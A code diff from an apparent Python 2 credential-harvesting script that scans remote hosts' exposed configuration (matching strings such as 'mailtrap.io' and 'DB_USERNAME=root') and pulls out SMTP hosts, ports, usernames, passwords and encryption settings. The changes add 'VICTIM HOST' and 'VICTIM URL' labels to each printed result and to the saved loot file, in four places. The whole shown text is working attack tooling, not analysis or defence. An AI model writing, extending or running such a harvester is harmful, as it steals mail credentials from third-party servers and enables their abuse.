@@ -113,6 +113,8 @@ def kuy(lEnVy):
 
 					print "\n= = = = = = = = = = = = = = = = = = = = = = = ="
 
+					print "VICTIM HOST     => {}".format(eNv)
+
 					print "SMTP HOST       => {}".format(SMTP[0])
 
 					print "SMTP PORT       => {}".format(PORT[0])
@@ -125,7 +127,7 @@ def kuy(lEnVy):
 
 					print "= = = = = = = = = = = = = = = = = = = = = = = ="
 
-					SEnVy.write('SMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n\n')
+					SEnVy.write('VICTIM URL : ' + eNv + '\nSMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n\n')
 
 
 
@@ -163,6 +165,8 @@ def kuy(lEnVy):
 
 					print "\n= = = = = = = = = = = = = = = = = = = = = = = ="
 
+					print "VICTIM HOST     => {}".format(eNv)
+
 					print "SMTP HOST       => {}".format(SMTP[0])
 
 					print "SMTP PORT       => {}".format(PORT[0])
@@ -175,7 +179,7 @@ def kuy(lEnVy):
 
 					print "= = = = = = = = = = = = = = = = = = = = = = = ="
 
-					SEnVy.write('SMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n\n')
+					SEnVy.write('VICTIM URL : ' + eNv + '\nSMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n\n')
 
 			elif "mailtrap.io" in rsmTP.text:
 
@@ -237,6 +241,8 @@ def kuy(lEnVy):
 
 					print "\n= = = = = = = = = = = = = = = = = = = = = = = ="
 
+					print "VICTIM HOST     => {}".format(eNv)
+
 					print "SMTP HOST       => {}".format(SMTP[0])
 
 					print "SMTP PORT       => {}".format(PORT[0])
@@ -249,7 +255,7 @@ def kuy(lEnVy):
 
 					print "= = = = = = = = = = = = = = = = = = = = = = = ="
 
-					SEnVy.write('SMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n\n')
+					SEnVy.write('VICTIM URL : ' + eNv + '\nSMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n\n')
 					
 
 
@@ -290,6 +296,8 @@ def kuy(lEnVy):
 
 					print "\n= = = = = = = = = = = = = = = = = = = = = = = ="
 
+					print "VICTIM HOST     => {}".format(eNv)
+
 					print "SMTP HOST       => {}".format(SMTP[0])
 
 					print "SMTP PORT       => {}".format(PORT[0])
@@ -302,7 +310,7 @@ def kuy(lEnVy):
 
 					print "= = = = = = = = = = = = = = = = = = = = = = = ="
 
-					SEnVy.write('SMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n\n')
+					SEnVy.write('VICTIM URL : ' + eNv + '\nSMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n\n')
 
 
 			elif "DB_USERNAME=root" in rsmTP.text:
